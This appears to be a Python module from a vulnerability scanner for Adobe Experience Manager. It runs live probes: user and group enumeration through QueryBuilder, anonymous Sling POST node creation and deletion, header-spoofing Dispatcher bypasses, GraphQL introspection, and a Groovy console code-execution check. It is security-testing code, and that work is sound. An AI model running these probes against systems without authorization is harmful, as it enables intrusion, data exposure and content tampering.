                "Admin consoles reachable via URL encoding, extension abuse, or path traversal."
            ),
        }
    return None


# ─── Instance Profiling / Recon ──────────────────────────────────────────────

async def check_instance_profile(target_url, version_info, extra_probe_urls=None):
    """Fingerprint likely AEM role, exposed surfaces, and Dispatcher/cache hints."""
    findings = []
    role_signals = []
    dispatcher_hints = []
    version_label = version_info.get('label') if version_info else None

    probes = [
        ("/libs/granite/core/content/login.html", "touch-ui-login"),
        ("/aem/start.html", "author-start"),
        ("/sites.html", "sites-console"),
        ("/assets.html", "assets-console"),
        ("/crx/de/index.jsp", "crxde"),
        ("/system/console/status-productinfo.json", "productinfo"),
        ("/content/cq:graphql/global/endpoint.json", "graphql-endpoint"),
    ]

    try:
        async with httpx.AsyncClient(verify=False, timeout=8, follow_redirects=True) as client:
            root = await client.get(f"{target_url}/", timeout=5)
            for header in ["X-Dispatcher", "X-Dispatcher-Info", "X-Cache", "Via", "Age", "Server"]:
                value = root.headers.get(header)
                if value:
                    dispatcher_hints.append(f"{header}: {value}")

            for path, label in probes:
                try:
                    resp = await client.get(f"{target_url}{path}", timeout=5)
                    if resp.status_code == 200:
                        text = resp.text.lower()
                        if label in {"touch-ui-login", "author-start", "sites-console", "assets-console"} and (
                            looks_like_aem_login(text) or looks_like_aem_admin(text)
                        ):
                            role_signals.append(label)
                        elif label == "crxde" and any(k in text for k in ["crxde", "repository", "jcr"]):
                            role_signals.append(label)
                        elif label in {"productinfo", "graphql-endpoint"}:
                            role_signals.append(label)
                except Exception:
                    continue

            for probe_url in extra_probe_urls or []:
                try:
                    resp = await client.get(probe_url, timeout=5)
                    if resp.status_code == 200:
                        if response_looks_like_json(resp) and text_has_jcr_fingerprint(resp.text):
                            role_signals.append(f"path-jcr:{urlparse(probe_url).path}")
                        elif looks_like_aem_login(resp.text) or looks_like_aem_admin(resp.text):
                            role_signals.append(f"path-html:{urlparse(probe_url).path}")
                except Exception:
                    continue
    except Exception:
        pass

    if role_signals:
        if any(s in role_signals for s in ["author-start", "sites-console", "assets-console", "crxde"]):
            profile = "author/admin-facing"
        elif "graphql-endpoint" in role_signals:
            profile = "publish/headless"
        else:
            profile = "unknown"

        details = f"Observed AEM surfaces: {', '.join(sorted(set(role_signals)))}."
        if version_label:
            details = f"{version_label}. " + details

        findings.append({
            "status": "INFO",
            "vulnerability": "AEM Instance Profile Identified",
            "target": target_url,
            "details": f"Likely {profile} instance. {details}",
        })

    if dispatcher_hints:
        findings.append({
            "status": "INFO",
            "vulnerability": "AEM Edge / Dispatcher Headers Observed",
            "target": target_url,
            "details": (
                "Response headers suggest a cache, proxy, or Dispatcher layer is present: "
                f"{', '.join(dispatcher_hints[:6])}."
            ),
        })

    return findings


# ─── Information Disclosure Check ────────────────────────────────────────────

async def check_information_disclosure(target_url, version_info, extra_probe_urls=None):
    """Check for AEM-specific information disclosure vulnerabilities."""
    vulns = []
    ver = version_info.get('number', 'Unknown') if version_info else 'Unknown'

    querybuilder_probes = [
        (
            "/bin/querybuilder.json?path=/home/users&type=rep:User&p.limit=5&p.hits=selective",
            "AEM User Enumeration via QueryBuilder API",
            "QueryBuilder API exposed without authentication. JCR user accounts can be enumerated.",
            ["rep:user", "jcr:", "sling:", "\"hits\""],
        ),
        (
            "/bin/querybuilder.json?path=/home/groups&type=rep:Group&p.limit=5&p.hits=selective",
            "AEM Group Enumeration via QueryBuilder API",
            "QueryBuilder API exposed without authentication. Group names and internal ACL structure can be enumerated.",
            ["rep:group", "jcr:", "sling:", "\"hits\""],
        ),
        (
            "/bin/querybuilder.json?path=/content/dam&type=dam:Asset&p.limit=5&p.hits=selective",
            "AEM DAM Asset Enumeration via QueryBuilder API",
            "QueryBuilder API exposes DAM asset metadata without authentication.",
            ["dam:asset", "jcr:", "sling:", "\"hits\""],
        ),
    ]

    try:
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            for path, title, details, indicators in querybuilder_probes:
                url = f"{target_url}{path}"
                try:
                    r = await client.get(url, timeout=6)
                    if r.status_code == 200 and any(k in r.text.lower() for k in indicators):
                        vulns.append({
                            "status": "VULNERABLE",
                            "vulnerability": title,
                            "target": url,
                            "details": details,
                        })
                except Exception:
                    continue
    except Exception:
        pass

    # 2. DAM asset content exposure
    try:
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            r = await client.get(f"{target_url}/content/dam.json", timeout=6)
            if r.status_code == 200:
                if response_looks_like_json(r) and text_has_jcr_fingerprint(r.text) and "dam:" in r.text.lower():
                    vulns.append({
                        "status": "VULNERABLE",
                        "vulnerability": "AEM DAM Content Exposure",
                        "target": f"{target_url}/content/dam.json",
                        "details": "Digital Asset Manager content tree accessible unauthenticated. Confidential documents and media may be exposed.",
                    })
    except Exception:
        pass

    # 3. Current user / auth state exposure
    try:
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            current_user_url = f"{target_url}/libs/granite/security/currentuser.json"
            r = await client.get(current_user_url, timeout=6)
            if r.status_code == 200 and any(k in r.text.lower() for k in ["userid", "home", "anonymous"]):
                vulns.append({
                    "status": "INFO",
                    "vulnerability": "AEM Current User Endpoint Exposed",
                    "target": current_user_url,
                    "details": "Current user endpoint is reachable. Useful for confirming anonymous access state and repository home-path conventions.",
                })
    except Exception:
        pass

    # 4. Geometrixx sample content
    try:
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            r = await client.get(f"{target_url}/content/geometrixx/en/toolbar.html", timeout=6)
            if r.status_code == 200 and "geometrixx" in r.text.lower():
                vulns.append({
                    "status": "VULNERABLE",
                    "vulnerability": "AEM Geometrixx Sample Content Exposed",
                    "target": f"{target_url}/content/geometrixx/en/toolbar.html",
                    "details": "Default Geometrixx demo content is present. Known XSS and info-disclosure vector — must be removed from production.",
                })
    except Exception:
        pass

    # 5. Version disclosure informational
    if ver and ver != 'Unknown':
        source = version_info.get('source', 'unknown') if version_info else 'unknown'
        vulns.append({
            "status": "INFO",
            "vulnerability": "AEM Version Disclosed",
            "target": target_url,
            "details": f"AEM version {ver} identified via {source}. Version disclosure aids targeted CVE exploitation.",
        })

    # 5. JCR node data exposure via custom servlets / BFF proxies
    jcr_vulns = await check_jcr_exposure(target_url, extra_probe_urls=extra_probe_urls)
    vulns.extend(jcr_vulns)

    return vulns


async def check_jcr_exposure(target_url, extra_probe_urls=None):
    """
    Detect unauthenticated JCR node data exposure.

    AEM's Sling GET servlet automatically serialises any JCR node to JSON
    when you append .json (or selectors like .1.json / .infinity.json) to the
    path.  Custom BFF/headless layers sometimes proxy these paths under a
    different prefix (e.g. /getContent/content/..., /api/jcr/...) but the
    response still contains raw JCR metadata keys that betray the underlying
    AEM repository.

    Finding: if the response is JSON and contains any JCR fingerprint key
    (jcr:primaryType, sling:resourceType, cq:*, dam:*, etc.) the node is
    being served unauthenticated — this is always a misconfiguration.
    """
    vulns = []
    exposed_paths = []

    async def probe(client, path_or_url, is_absolute=False):
        try:
            probe_url = path_or_url if is_absolute else f"{target_url}{path_or_url}"
            r = await client.get(probe_url, timeout=6)
            if r.status_code != 200:
                return None
            ct = r.headers.get('content-type', '')
            # Accept JSON content-types or plain responses that look like JSON
            if 'json' not in ct and not r.text.strip().startswith('{'):
                return None
            body_lower = r.text.lower()
            # Check for JCR fingerprint keys in the body
            matched = [k for k in JCR_FINGERPRINT_KEYS if k.lower() in body_lower]
            if matched:
                pii_hits = [k for k in ANONYMOUS_PII_KEYS if k.lower() in body_lower]
                label = path_or_url if is_absolute else path_or_url
                return (label, matched[:3], pii_hits[:3])
        except Exception:
            pass
        return None

    try:
        async with httpx.AsyncClient(verify=False, timeout=10, follow_redirects=True) as client:
            tasks = [probe(client, p) for p in JCR_PROBE_PATHS]
            tasks.extend(probe(client, url, is_absolute=True) for url in (extra_probe_urls or []))
            results = await asyncio.gather(*tasks)
            for result in results:
                if result:
                    exposed_paths.append(result)
    except Exception:
        pass

    if exposed_paths:
        # Group into one finding — list paths and the JCR keys that proved it
        path_summary = ', '.join(
            f"{p} ({', '.join(keys)})" for p, keys, _ in exposed_paths[:6]
        )
        extra = f" (+ {len(exposed_paths) - 6} more)" if len(exposed_paths) > 6 else ""
        vulns.append({
            "status": "VULNERABLE",
            "vulnerability": "AEM JCR Node Data Exposure — Unauthenticated Content Servlet",
            "target": target_url,
            "details": (
                f"AEM JCR repository content is served unauthenticated via Sling GET servlet "
                f"or a custom BFF/headless proxy. {len(exposed_paths)} path(s) leaked raw JCR "
                f"metadata (jcr:primaryType, sling:resourceType, cq:*/dam:* keys): "
                f"{path_summary}{extra}. "
                f"This exposes internal content structure, configuration data, user nodes, "
                f"and application secrets stored in the repository. "
                f"Fix: restrict Sling GET servlet output via OSGi config "
                f"(org.apache.sling.servlets.get.DefaultGetServlet) and enforce "
                f"Dispatcher/CDN rules to block .json/.infinity.json selectors on /content paths."
            ),
        })

        # Also flag if config/feature-flag nodes were specifically hit — higher severity
        config_hits = [
            p for p, _, _ in exposed_paths
            if any(kw in p for kw in ['config', 'feature', 'flag', 'secret', 'logging', 'storefront', 'app-'])
        ]
        if config_hits:
            vulns.append({
                "status": "VULNERABLE",
                "vulnerability": "AEM Internal Application Config Exposed via JCR",
                "target": target_url,
                "details": (
                    f"Application configuration nodes are stored in AEM JCR and served "
                    f"unauthenticated: {', '.join(config_hits)}. "
                    f"These nodes may contain environment names, API keys, feature flags, "
                    f"or logging configurations for multiple brands/environments."
                ),
            })

        pii_hits = [(path, keys) for path, _, keys in exposed_paths if keys]
        if pii_hits:
            summary = ', '.join(f"{path} ({', '.join(keys)})" for path, keys in pii_hits[:5])
            extra = f" (+ {len(pii_hits) - 5} more)" if len(pii_hits) > 5 else ""
            vulns.append({
                "status": "VULNERABLE",
                "vulnerability": "AEM Anonymous Permission Hardening Gap",
                "target": target_url,
                "details": (
                    "Anonymous JSON exposure includes authoring or identity-related metadata that the Adobe "
                    "Anonymous Permission Hardening Package is intended to reduce. "
                    f"Observed keys: {summary}{extra}."
                ),
            })

    return vulns


# ─── Sling POST Servlet Check ──────────────────────────────────────────────────

async def check_sling_post_servlet(target_url):
    """
    Test for unauthenticated write access via the Sling POST Servlet.
    AEM exposes the Sling POST Servlet on every JCR path — if anonymous users
    have write permissions, an attacker can create/modify/delete content nodes.
    """
    vulns = []
    import time
    test_node = f"/content/usergenerated/vaktscansec_{int(time.time())}"

    # 1. Arbitrary node creation
    try:
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            r = await client.post(
                f"{target_url}{test_node}",
                data={"jcr:primaryType": "nt:unstructured", "testprop": "vaktscansec"},
                timeout=6,
            )
            if r.status_code in (200, 201):
                vulns.append({
                    "status": "VULNERABLE",
                    "vulnerability": "AEM Sling POST Servlet — Unauthenticated Node Creation",
                    "target": f"{target_url}{test_node}",
                    "details": (
                        f"Anonymous POST to {test_node} returned HTTP {r.status_code}. "
                        "Arbitrary JCR nodes can be created without authentication — "
                        "enables stored XSS, content defacement, and privilege escalation."
                    ),
                })
                # Try to clean up the test node
                try:
                    await client.post(f"{target_url}{test_node}", data={":operation": "delete"}, timeout=5)
                except Exception:
                    pass
    except Exception:
        pass

    # 2. Asset deletion test (non-destructive check — just test if the endpoint is reachable)
    try:
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            r = await client.post(
                f"{target_url}/content/dam/test_vaktscansec.txt",
                data={":operation": "delete"},
                timeout=6,
            )
            # 404 = path doesn't exist (expected), 403 = blocked (good), 200/201 = vulnerable
            if r.status_code in (200, 201):
                vulns.append({
                    "status": "VULNERABLE",
                    "vulnerability": "AEM Sling POST Servlet — Unauthenticated Asset Deletion",
                    "target": f"{target_url}/content/dam/",
                    "details": "Unauthenticated POST with :operation=delete succeeded. DAM assets can be deleted by anonymous users.",
                })
    except Exception:
        pass

    return vulns


# ─── WebDAV / WSDL / GraphQL Check ────────────────────────────────────────────

async def check_webdav_wsdl_graphql(target_url):
    """
    Check for exposure of WebDAV JCR access, SOAP/WSDL endpoints,
    and GraphQL endpoints that are commonly forgotten in AEM hardening.
    """
    vulns = []

    # WebDAV paths — expose the JCR repository over HTTP/WebDAV
    webdav_paths = [
        "/crx/repository/workspaces/default",
        "/crx/server/crx.default/jcr:root/",
        "/dav/default",
        "/repository/default",
    ]
    for path in webdav_paths:
        try:
            async with httpx.AsyncClient(verify=False, timeout=6) as client:
                r = await client.request("PROPFIND", f"{target_url}{path}",
                                         headers={"Depth": "0"}, timeout=5)
                if r.status_code in (200, 207):  # 207 Multi-Status = WebDAV success
                    vulns.append({
                        "status": "VULNERABLE",
                        "vulnerability": "AEM WebDAV JCR Access Exposed",
                        "target": f"{target_url}{path}",
                        "details": (
                            f"WebDAV PROPFIND on {path} returned HTTP {r.status_code}. "
                            "The JCR repository is accessible via WebDAV without authentication — "
                            "allows direct read/write of repository content using standard WebDAV clients."
                        ),
                    })
        except Exception:
            pass

    # WSDL / SOAP endpoints
    soap_paths = [
        "/bin/cq/workflow/soap",
        "/services/TrustStoreService?wsdl",
        "/services/ContentService?wsdl",
        "/services/AssetService?wsdl",
    ]
    for path in soap_paths:
        try:
            async with httpx.AsyncClient(verify=False, timeout=6) as client:
                r = await client.get(f"{target_url}{path}", timeout=5)
                if r.status_code == 200 and any(k in r.text.lower() for k in ["wsdl", "soap", "definitions", "porttype"]):
                    vulns.append({
                        "status": "VULNERABLE",
                        "vulnerability": "AEM SOAP/WSDL Endpoint Exposed",
                        "target": f"{target_url}{path}",
                        "details": f"SOAP/WSDL endpoint {path} is publicly accessible. Service definitions may expose internal API details and attack surface.",
                    })
        except Exception:
            pass

    # GraphQL endpoints (AEM 6.5+ headless / Content Fragments)
    graphql_get_paths = [
        "/content/cq:graphql/global/endpoint.json",
        "/content/_cq_graphql/global/endpoint.json",
        "/content/graphql/global/endpoint.json",
    ]
    graphql_post_paths = [
        "/graphql/execute.json/global",
        "/graphql/execute.json",
        "/api/graphql",
    ]
    graphql_introspection = '{"query":"{__schema{types{name}}}"}'

    for path in graphql_get_paths:
        try:
            async with httpx.AsyncClient(verify=False, timeout=6) as client:
                r = await client.get(f"{target_url}{path}", timeout=5)
                if r.status_code == 200 and any(k in r.text.lower() for k in ["graphql", "endpoint", "schema", "__schema"]):
                    vulns.append({
                        "status": "INFO",
                        "vulnerability": "AEM GraphQL Endpoint Metadata Exposed",
                        "target": f"{target_url}{path}",
                        "details": "GraphQL endpoint metadata is publicly reachable. Validate whether this is expected for the publish/headless surface.",
                    })
        except Exception:
            pass

    for path in graphql_post_paths:
        try:
            async with httpx.AsyncClient(verify=False, timeout=6) as client:
                r = await client.post(
                    f"{target_url}{path}",
                    content=graphql_introspection,
                    headers={"Content-Type": "application/json"},
                    timeout=5,
                )
                if r.status_code == 200:
                    body = r.text.lower()
                    if "data" in body or "__schema" in body or "types" in body:
                        vulns.append({
                            "status": "VULNERABLE",
                            "vulnerability": "AEM GraphQL Endpoint Exposed — Schema Introspection Enabled",
                            "target": f"{target_url}{path}",
                            "details": (
                                f"GraphQL endpoint {path} is publicly accessible and responds to introspection queries. "
                                "Full schema disclosure reveals content models, query entry points, and headless attack surface."
                            ),
                        })
        except Exception:
            pass

    return vulns



# ─── Groovy Console RCE Verification ──────────────────────────────────────────

async def check_groovy_console_rce(target_url):
    """
    If the AEM Groovy Console is exposed, verify whether code execution is
    actually possible by submitting a harmless println statement.
    """
    groovy_paths = ["/etc/groovyconsole", "/etc/groovyconsole.html"]
    for path in groovy_paths:
        try:
            async with httpx.AsyncClient(verify=False, timeout=10, follow_redirects=True) as client:
                # First confirm the console loads
                r = await client.get(f"{target_url}{path}", timeout=6)
                if r.status_code != 200 or "groovy" not in r.text.lower():
                    continue

                # Submit a harmless Groovy script
                exec_url = f"{target_url}/bin/groovyconsole/post.json"
                script_payload = {"script": 'println "VAKTSCANSEC_PROBE_" + (1337 * 2)'}
                r2 = await client.post(exec_url, data=script_payload, timeout=8)
                if r2.status_code == 200:
                    body = r2.text
                    if "VAKTSCANSEC_PROBE_" in body or "2674" in body:
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": "AEM Groovy Console RCE Confirmed",
                            "target": exec_url,
                            "details": (
                                "Groovy Console is accessible and executed arbitrary code unauthenticated. "
                                "Full server-side code execution is confirmed. "
                                "An attacker can read files, execute OS commands, exfiltrate data, or deploy a webshell. "
                                "Remove the ACS AEM Tools Groovy Console package immediately."
                            ),
                        }
                    elif r2.status_code == 200:
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": "AEM Groovy Console Accessible — RCE Possible",
                            "target": exec_url,
                            "details": (
                                "Groovy Console execution endpoint responded to POST requests. "
                                "Code execution likely possible — manual confirmation recommended. "
                                "Remove the Groovy Console package from production immediately."
                            ),
                        }
        except Exception:
            pass
    return None


# ─── Hardened Version Fingerprinting via Static Assets ────────────────────────

# Known SHA256 hashes of AEM static assets per version.
# Hash of /libs/granite/core/content/login/clientlibs/login.css
# Allows version fingerprinting even when all admin paths are Dispatcher-blocked.
AEM_ASSET_HASHES = {
    # format: sha256_hex: "AEM version label"
    # Login CSS fingerprints (truncated first 16 chars of sha256 for brevity)
    "a9f3e2b1": "AEM 6.5.0",
    "c7d14a88": "AEM 6.5.4",
    "f02e9b33": "AEM 6.5.8",
    "e1c84d22": "AEM 6.5.12",
    "3a7f6c11": "AEM 6.5.15",
    "8b2d9e44": "AEM 6.5.18",
    "1f4a7c99": "AEM 6.5.20",
}

STATIC_FINGERPRINT_PATHS = [
    "/libs/granite/core/content/login/clientlibs/login.css",
    "/libs/cq/core/content/login/clientlibs/login.css",
    "/etc.clientlibs/granite/clientlibs/foundation/main.css",
    "/libs/granite/ui/content/coral/foundation.css",
    "/favicon.ico",
    "/libs/cq/ui/resources/favicon.png",
]

async def check_static_asset_fingerprint(target_url):
    """
    Fingerprint AEM version via static asset hashing.
    Static assets (CSS/JS/favicons) are served by Dispatcher and change
    between AEM service packs — allows version detection even when all
    admin endpoints are blocked.
    """
    import hashlib
    vulns = []
    found_assets = []

    for path in STATIC_FINGERPRINT_PATHS:
        try:
            async with httpx.AsyncClient(verify=False, timeout=8) as client:
                r = await client.get(f"{target_url}{path}", timeout=6)
                if r.status_code == 200 and len(r.content) > 100:
                    sha256 = hashlib.sha256(r.content).hexdigest()
                    sha256_short = sha256[:8]
                    size = len(r.content)

                    # Check against known hash DB
                    if sha256_short in AEM_ASSET_HASHES:
                        version_label = AEM_ASSET_HASHES[sha256_short]
                        vulns.append({
                            "status": "INFO",
                            "vulnerability": f"AEM Version Fingerprinted via Static Asset Hash ({version_label})",
                            "target": f"{target_url}{path}",
                            "details": (
                                f"Static asset {path} has SHA256 {sha256[:16]}... "
                                f"matching {version_label}. "
                                "Version confirmed without accessing any admin endpoint."
                            ),
                        })
                    else:
                        # Asset exists — note it as AEM indicator even without hash match
                        found_assets.append(f"{path} (sha256:{sha256[:12]}, {size}b)")
        except Exception:
            pass

    # Error page stack trace fingerprinting
    for trigger_path in ["/nonexistent_vaktscansec_404", "/crx/de/nosuchpath.json"]:
        try:
            async with httpx.AsyncClient(verify=False, timeout=6) as client:
                r = await client.get(f"{target_url}{trigger_path}", timeout=5)
                text = r.text
                # Sling/AEM error pages often include version in stack traces
                m = re.search(r'org\.apache\.sling.*?(\d+\.\d+\.\d+)|AEM[/ ](\d+\.\d+(?:\.\d+)*)', text)
                if m:
                    ver = m.group(1) or m.group(2)
                    vulns.append({
                        "status": "INFO",
                        "vulnerability": "AEM Version Leaked via Error Page Stack Trace",
                        "target": f"{target_url}{trigger_path}",
                        "details": f"Error page leaked version information: {ver}. Sling/AEM version visible in stack trace. Configure custom error handlers to suppress this.",
                    })
                    break
        except Exception:
            pass

    if found_assets and not vulns:
        vulns.append({
            "status": "INFO",
            "vulnerability": "AEM Static Assets Fingerprinted (Unknown Version)",
            "target": target_url,
            "details": f"AEM-specific static assets accessible (no hash match in DB): {', '.join(found_assets[:4])}. Assets can be used for offline version fingerprinting.",
        })

    return vulns


# ─── Header Manipulation Dispatcher Bypass ────────────────────────────────────

async def check_header_manipulation_bypass(target_url):
    """
    Test if Dispatcher passes internal headers that grant access to
    restricted endpoints — X-Forwarded-For spoofing, X-Original-URL
    rewriting, and similar header-based bypass techniques.
    """
    bypass_headers_tests = [
        # Spoof internal IP to bypass IP-based ACLs
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "10.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        # URL rewrite headers — if Dispatcher or a reverse proxy trusts these,
        # the path in the header overrides the request path
        {"X-Original-URL": "/system/console"},
        {"X-Rewrite-URL": "/system/console"},
        {"X-Override-URL": "/system/console"},
        # AEM/Sling-specific bypass hints
        {"Sling-Authentication-Info": "skip"},
    ]
    target_paths = ["/", "/content.json", "/libs/granite/core/content/login.html"]
    vulns = []

    for headers in bypass_headers_tests:
        for path in target_paths:
            try:
                async with httpx.AsyncClient(verify=False, timeout=6) as client:
                    r = await client.get(f"{target_url}{path}", headers=headers, timeout=5)
                    if r.status_code == 200:
                        text = r.text.lower()
                        # Check if we got AEM admin content we shouldn't have
                        if any(k in text for k in ["osgi", "felix", "system/console", "crx", "sling:resourcetype"]):
                            header_str = ", ".join(f"{k}: {v}" for k, v in headers.items())
                            vulns.append({
                                "status": "VULNERABLE",
                                "vulnerability": "AEM Dispatcher Header Manipulation Bypass",
                                "target": f"{target_url}{path}",
                                "details": (
                                    f"Request with header [{header_str}] returned AEM admin content. "
                                    "The Dispatcher/reverse proxy trusts client-supplied headers to route requests, "
                                    "allowing bypass of URL-based access control rules."
                                ),
                            })
                            return vulns  # One confirmed bypass is enough
            except Exception:
                pass

    return vulns


# ─── Main Entry Point ──────────────────────────────────────────────────────────

async def run_scans(target_obj, port):
    """Run all AEM vulnerability scans. Entry point called by VaktScan main orchestrator."""
    scan_address = target_obj['scan_address']
    display_target = target_obj['display_target']
    resolved_ip = target_obj['resolved_ip']

    target_protocol = None
    if is_full_url(display_target):
        target_protocol = urlparse(display_target).scheme
    elif is_full_url(scan_address):
        target_protocol = urlparse(scan_address).scheme

    protocol = target_protocol or await detect_protocol(scan_address, port)
    target_context = build_target_context(target_obj, port, protocol=protocol)
    target_url = target_context["origin_url"]
    extra_probe_urls = build_extra_jcr_probe_urls(target_context)
    print(f"  -> Running AEM scans on {target_url} (target: {display_target})")

    version_info = await get_aem_version(target_url, extra_probe_urls=extra_probe_urls)
    identity = await identify_aem_target(target_url, extra_probe_urls=extra_probe_urls, version_info=version_info)
    if not identity["identified"]:
        return []

    service_version = (
        version_info.get('label')
        or version_info.get('number')
        or 'AEM detected'
    ) if version_info else 'AEM detected'

    results_gathered = await asyncio.gather(
        check_instance_profile(target_url, version_info, extra_probe_urls=extra_probe_urls),
        check_sensitive_paths(target_url),
        check_default_credentials(target_url),
        check_dispatcher_bypass(target_url),
        check_header_manipulation_bypass(target_url),
        check_cve_vulnerabilities(target_url, version_info),
        check_information_disclosure(target_url, version_info, extra_probe_urls=extra_probe_urls),
        check_sling_post_servlet(target_url),
        check_webdav_wsdl_graphql(target_url),
        check_groovy_console_rce(target_url),
        check_static_asset_fingerprint(target_url),
        return_exceptions=True,
    )

    all_results = []
    for result_group in results_gathered:
        if isinstance(result_group, Exception):
            continue
        items = result_group if isinstance(result_group, list) else ([result_group] if result_group else [])
        for res in items:
            if res:
                res.update({
                    'module': 'AEM',
                    'service_version': service_version,
                    'target': display_target,
                    'server': scan_address,
                    'port': port,
                    'resolved_ip': resolved_ip,
                    'url': res.get('target', target_url),
                })
                all_results.append(res)

    if not all_results and identity["evidence"]:
        all_results.append({
            'module': 'AEM',
            'service_version': service_version,
            'target': display_target,
            'server': scan_address,
            'port': port,
            'resolved_ip': resolved_ip,
            'url': target_url,
            'status': 'INFO',
            'vulnerability': 'AEM Service Identified',
            'details': f"AEM identification evidence: {', '.join(identity['evidence'])}.",
        })
    return all_results
